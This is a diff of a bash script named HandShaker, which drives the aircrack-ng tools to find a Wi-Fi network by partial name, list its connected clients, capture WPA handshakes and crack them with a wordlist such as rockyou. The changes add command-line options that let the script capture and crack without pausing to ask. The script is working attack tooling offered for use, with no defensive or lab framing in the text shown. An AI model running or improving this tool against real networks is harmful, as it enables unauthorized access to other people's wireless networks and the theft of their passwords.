@@ -49,7 +49,7 @@ fclientscan()
 		then
 			CHAN=${CHAN:0:1}
 	fi
-	$COLOR 2;echo " [*] $ESSID Found!    BSSID: $BSSID    CHANNEL: $CHAN"
+	$COLOR 2;echo " [*]  $ESSID Found!    BSSID: $BSSID    CHANNEL: $CHAN [*]"
 	echo
 	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
 	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
@@ -64,12 +64,11 @@ fclientscan()
 	grep 'Station' -A 10 $HOME/tmp1-01.csv > $HOME/tmp
 	while read LINE
 		do
-			if [ ${LINE:0:4} != "Stat" ]
+			if [ ${LINE:0:4} != "Stat" ] 2> /dev/null
 				then
 					echo ${LINE:0:17} >> $HOME/tmp1
 			fi
 		done < $HOME/tmp
-	clear
 	while read LINE
 		do
 			case ${LINE:2:1} in
@@ -96,7 +95,7 @@ fcap()
 			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
 			cat $HOME/tmp1
 			echo
-			$COLOR 4;echo " [*] Please paste clent MAC or Press Enter to use the first one:";$COLOR 9 
+			$COLOR 4;echo " [>] Please paste clent MAC or Press Enter to use the first one:";$COLOR 9 
 			read -p "  >" CLIE
 	fi
 	if [ $CLIE -z ] 2> /dev/null
@@ -117,7 +116,7 @@ fcap()
 			echo " [ WPA handshake: $BSSID "
 			$COLOR 2;echo " [^] in the airodump window if successful [^]";$COLOR 9
 			echo
-			$COLOR 4;read -p " [*] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
+			$COLOR 4;read -p " [>] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
 			if [ $WASCAP = "n" ] 2> /dev/null
 				then
 					clear
@@ -148,15 +147,20 @@ fcap()
 			$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/hs/$FILENAME2";$COLOR 9
 			echo
 			echo
-			$COLOR 4; echo " [*] Do you want to crack? [Y/n]";$COLOR 9
-			read -p "  >" DOCRK
-			case $DOCRK in
-				"")fcrack;;
-				"Y")fcrack;;
-				"y")fcrack;;
-				"n")fexit;;
-				"N")fexit
-			esac
+			if [ $WORDLIST -z ] 2> /dev/null
+				then
+					$COLOR 4; echo " [>] Do you want to crack? [Y/n]";$COLOR 9
+					read -p "  >" DOCRK
+					case $DOCRK in
+						"")fcrack;;
+						"Y")fcrack;;
+						"y")fcrack;;
+						"n")fexit;;
+						"N")fexit
+					esac
+				else
+					fcrack
+			fi
 		else
 			$COLOR 1;echo " [*] Sorry, handshake not captured";$COLOR 9
 			echo
@@ -170,11 +174,15 @@ fcap()
 fcrack()
 {
 	clear
-	$COLOR 4;echo " [>] Please enter the full path of a wordlist to use";$COLOR 9
-	read -e -p "  >" WORDLIST
+	if [ $WORDLIST -z ] 2> /dev/null
+		then
+			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use";$COLOR 9
+			read -e -p "  >" WORDLIST
+	fi
 	if [ ! -f $WORDLIST ] 2> /dev/null
 		then
 			$COLOR 1;echo " [*] ERROR $WORLIST not found, try again..";$COLOR 9
+			WORDLIST=""
 			sleep 1
 			fcrack
 		else
@@ -194,13 +202,14 @@ fexit()
 fhelp()
 {
 	clear
-	echo """ HandShaker - detect, deauth and capture handshakes by PARTIALESSID
-	Usage: handshaker x 
-			x - Partial unique PARTIALESSID (required)
-
+	echo """ HandShaker - Detect, capture and crack WPA/2 handshakes by partial unique ESSID
+	Usage: handshaker x y z
+	
+			x - Partial unique ESSID (required)
+			y - Wireless Interface card
+			z - path to wordlist to use for cracking
 				
-	eg. handshaker BTHub3-F
-"""
+	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt"""
 exit
 }
 
@@ -220,7 +229,7 @@ mkdir -p $HOME/Desktop/hs
 if [ $MOND -z ] 2> /dev/null
 	then
 		clear
-		$COLOR 4;echo " [*] Which interface do you want to use?:";$COLOR 9
+		$COLOR 4;echo " [>] Which interface do you want to use?:";$COLOR 9
 		echo
 		iwconfig | grep "wlan"
 		echo
@@ -229,7 +238,7 @@ if [ $MOND -z ] 2> /dev/null
 		airmon-ng start $NIC
 		clear
 	else
-		NIC=mon0
+		NIC="mon0"
 		clear
 fi
 fapscan
@@ -238,6 +247,22 @@ fapscan
 trap fexit 2
 
 PARTIALESSID="$1"
+if [ $3 -z ] 2> /dev/null
+	then
+		WORDLIST=""
+	else
+		WORDLIST=$3
+fi
+if [ $2 -z ] 2> /dev/null
+	then
+		GR=4S
+	else
+		MOND=$(ifconfig | grep mon0)
+		if [ $MOND -z ] 2> /dev/null
+			then
+				airmon-ng start $2
+		fi
+fi
 if [ $# -lt 1 ]
 	then
 		fhelp
